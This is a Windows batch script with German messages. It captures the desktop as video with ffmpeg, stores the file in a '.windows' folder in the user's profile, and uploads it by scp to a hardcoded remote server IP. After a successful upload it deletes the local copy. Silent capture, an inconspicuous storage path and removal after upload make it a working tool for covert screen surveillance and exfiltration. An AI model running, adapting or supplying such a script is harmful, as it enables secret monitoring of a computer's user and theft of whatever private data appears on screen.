@echo off
for /f "tokens=2 delims==" %%I in ('wmic os get localdatetime /value') do set "dt=%%I"
set "ts=%dt:~0,4%-%dt:~4,2%-%dt:~6,2%_%dt:~8,2%-%dt:~10,2%-%dt:~12,2%"
set "file=%USERPROFILE%\.windows\video_%ts%.mp4"

start /b ffmpeg -f gdigrab -framerate 30 -i desktop -vcodec libx264 -pix_fmt yuv420p "%file%" >nul 2>&1

echo Aufnahme gestartet... Bitte warten.
timeout /t 10 /nobreak >nul REM Edit Recoding Time Here

taskkill /IM ffmpeg.exe /T /F >nul 2>&1
timeout /t 2 /nobreak >nul

echo Sende Video an den Server via SCP...
scp "%file%" ubuntu@193.123.189.154:/home/ubuntu/.ssh/screenshots/

if %errorlevel% equ 0 (
    del "%file%"
    echo Video erfolgreich hochgeladen und lokal geloeschts.
) else (
    echo Fehler beim Upload. Datei wurde als Backup lokal behalten.
)
pause